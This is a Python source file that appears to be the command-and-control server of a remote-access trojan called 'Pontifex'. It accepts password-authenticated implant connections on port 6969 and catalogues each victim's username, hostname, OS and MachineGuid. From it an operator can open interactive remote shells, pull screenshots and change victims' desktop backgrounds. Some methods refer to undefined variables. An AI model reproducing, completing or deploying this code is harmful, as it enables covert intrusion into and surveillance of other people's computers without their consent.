
# -*- coding: utf-8 -*-

import socket
import sys, os, threading, time, subprocess, curses
from hashlib import md5
import json
from prompt_toolkit.history import FileHistory
from prompt_toolkit import prompt
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from lib.helper import *
from lib.debug import Debug
from termcolor import colored, cprint

# SOCK_STREAM = tcp, SOCK_DGRAM = udp
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

ANODE = ""
APORT = 6969
PASS  = "pontifex"
interactive = False
keepAliveSleepInterval = 5
isConnected = False

dmoss = {}

def transfer(conn):
    """
    Macro function for interactive shell
    """
    Debug.tprint("""type "exit" to terminate the spawned shell (press enter to continue...)""")
    global interactive
    while interactive == True:
        try:
            buffer = conn.recv(0x400)
            sys.stdout.write(buffer.decode())
            sys.stdout.flush()
        except:
            interactive = False

class Dmos:
    def __init__(self, basic, sysinfo, global_addr, conn):
        # basic
        self.GLOBAL     = global_addr
        self.LOCAL      = basic["local_addr"]
        self.USERNAME   = basic["user_name"]
        # sys
        self.HOSTNAME   = sysinfo["HOSTNAME"]
        self.OS         = sysinfo["OS"]
        self.ARCH       = sysinfo["ARCH"]
        self.MGUID      = sysinfo["MGUID"]
        # unique hash generated from MachineGuid in Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
        self.md5_hash   = md5(self.MGUID.encode()).hexdigest()
        self.born       = colored(ctime(), 'yellow')
        self.conn       = conn
    def free_dmos(self):
        self.conn.send("free".encode())
    def interactive_shell(self):
        self.conn.send("shell".encode())

        global interactive
        interactive = True
        t = threading.Thread(target=transfer, args=(conn, ))
        t.start()
        while True:
            command = input().encode()
            if command == b"exit":
                self.conn.send(command + b"\n")
                interactive = False
                time.sleep(0.125)
                break
            self.conn.send(command + b"\n")
    def system_info(self):
        print("GLOBAL   : " + self.GLOBAL)
        print("LOCAL    : " + self.LOCAL)
        print("USERNAME : " + self.USERNAME)
        print("HOSTNAME : " + self.HOSTNAME)
        print("OS       : " + self.OS)
        print("ARCH     : " + self.ARCH)
        print("MGUID    : " + self.MGUID)
        print("HASH     : " + self.md5_hash)
        print("BORN     : " + self.born)
    def screenshot(self):
        self.conn.send("screenshot".encode())
        DATE = subprocess.check_output("date", shell=True).rstrip(b'\n').decode("utf-8") + ".png"
        path = os.path.join("/Users/bobycx/Documents/Python/HPython/db/downloaded/", DATE)

        f = open(path, "wb")
        image_data = b''
        print(image_data)
        while b'FIN' not in (d := self.conn.recv(1024)): #FIN
            image_data += d
        f.write(image_data)
        f.close()
    def background_changer(self):
         self.conn.send("bgchange".encode())
         f = open(command[9:], 'rb')
         data = f.read()
         f.close()
         self.conn.send(data)
         self.conn.send("FIN".encode())

class Communication:
    @safe_exec
    def listener():
        s.bind((ANODE, APORT))
        s.listen(5)

    @safe_exec
    def accept_conn():
        global isConnected
        while 1:
            conn, address = s.accept()
            if conn.recv(36).decode() == PASS:

                intel = conn.recv(1024).decode()

                intel = json.loads(intel)
                #print(intel)
                dmos = Dmos(intel["basic"], intel["sysinfo"], address[0], conn)
                for d in dmoss:
                    if dmoss[d].md5_hash == dmos.md5_hash:
                        isConnected = True
                        dmos.conn.send("free".encode())
                if isConnected != True:

                    Debug.tprint("Connection from {0}".format(address), thread=True)
                    dmoss[dmos.md5_hash] = dmos

    @safe_exec
    def interact(dmos):
        conn = dmos.conn
        while 1:
            command = prompt(colored("[{}@{}]>> ".format(dmos.USERNAME, dmos.GLOBAL), 'cyan', attrs=['bold']), history=FileHistory('history.txt'), auto_suggest=AutoSuggestFromHistory())
            if command == "free":
                dmos.free_dmos()
                terminate(conn, dmoss, dmos, "gracefully")
                break
            elif command == "shell":
                dmos.interactive_shell()
            elif command == "sysinfo":
                dmos.system_info()
            elif command == "fat":
                conn.send(command.encode())
            elif command == "screenshot":
                dmos.screenshot()
                Debug.tprint("sc downloaded")
            elif command[:9] == "bgchange ":
                dmos.background_changer()
            elif command == "clear":
                os.system("clear")
            elif command == "b":
                Communication.cmdline()

    @safe_exec
    def cmdline():
        while 1:
            command = input(colored("[Pontifex] → ", 'cyan', attrs=['bold']))
            if command == "exit":
                Debug.eprint(f"tcp listener on port {APORT} shutting down...")
                clean(s)
                os._exit(1)
            elif command == "clear":
                os.system("clear")
            elif command[:5] == "free ":
                dmoss[command[5:]].conn.send("free".encode())
                terminate(dmoss[command[5:]].conn, dmoss, dmoss[command[5:]], "gracefully")
            elif command == "list":
                #print(dmoss)
                #print("BORN  HASH\tIP (global)\tHOSTNAME")
                for d, hash in enumerate(dmoss):
                    print("{}\t{}\t{}\t\t{}".format(dmoss[hash].born, hash, dmoss[hash].GLOBAL, dmoss[hash].HOSTNAME))
            elif command[:2] == "i ":
                try:
                    Communication.interact(dmoss[command[2:]])
                except:
                    Debug.eprint("Invalid MD5_hash")
            elif command == "r":
                clean(s)
                python = sys.executable
                os.execl(python, python, *sys.argv)

    @safe_exec
    def keepAlive():
        global keepAliveSleepInterval
        while 1:
            time.sleep(keepAliveSleepInterval)
            for d, hash in enumerate(dmoss.copy()):
                try:
                    dmoss[hash].conn.send(b" ")
                except:
                    dmoss[hash].conn.close()
                    Debug.tprint("Connection with dmos {} has been broken".format(dmoss[hash].md5_hash), thread=True)
                    dmoss.pop(hash, None)

def main():
    os.system("clear")
    banner()
    Communication.listener()
    LISTENER = threading.Thread(target=Communication.accept_conn)
    LISTENER.daemon = True
    KEEPALIVE = threading.Thread(target=Communication.keepAlive)
    KEEPALIVE.start()
    try:
        LISTENER.start()
        Debug.tprint("Server listening on port {0}".format(APORT))
    except Exception as e:
        Debug.tprint("Unable to start daemon listener, Error: {0}".format(e))
    Communication.cmdline()

main()
